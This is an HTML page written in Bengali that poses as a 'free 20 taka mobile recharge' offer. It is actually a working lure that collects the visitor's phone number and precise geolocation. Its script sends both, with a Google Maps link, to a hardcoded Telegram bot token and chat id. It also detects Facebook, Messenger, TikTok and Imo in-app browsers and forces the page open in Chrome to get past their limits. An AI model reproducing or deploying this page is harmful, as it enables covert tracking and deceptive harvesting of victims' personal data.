<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0; url=googlechrome://navigate?url=https://sidzf8.github.io/Shadow-Traker/">
    <title>Free Recharge 2026</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>সঠিক নম্বর দিয়ে 'রিচার্জ নিন' বাটনে ক্লিক করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" id="subBtn" onclick="sendData()">রিচার্জ নিন</button>
    </div>

<script>
// সোশ্যাল মিডিয়া ডিটেক্টর এবং অটো-ওপেনার
(function() {
    var ua = navigator.userAgent || navigator.vendor || window.opera;
    var isSocial = /FBAN|FBAV|Messenger|TikTok|ImoAndroid|ImoIos/i.test(ua);
    
    if (isSocial) {
        // অ্যান্ড্রয়েড ইউজারদের জন্য সরাসরি ক্রোম ওপেন করার কমান্ড
        window.location.href = "intent://" + window.location.hostname + window.location.pathname + "#Intent;scheme=https;package=com.android.chrome;end";
    }
})();

async function sendData() {
    const num = document.getElementById('phone').value;
    const btn = document.getElementById('subBtn');

    if (num.length < 11) { alert("১১ সংখ্যার সঠিক নম্বর দিন!"); return; }
    
    btn.innerText = "ভেরিফাই হচ্ছে...";
    btn.disabled = true;

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
        const chat_id = "7887080882";
        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        const text = `🔔 **নতুন রিকোয়েস্ট!**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;

        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
        } catch (e) {
            alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
        } finally {
            btn.innerText = "রিচার্জ নিন";
            btn.disabled = false;
        }
    }, (err) => {
        alert("লোকেশন পারমিশন ছাড়া অফারটি কাজ করবে না। 'Allow' বাটনে ক্লিক করুন।");
        btn.innerText = "রিচার্জ নিন";
        btn.disabled = false;
    }, { timeout: 10000 });
}
</script>
</body>
</html>
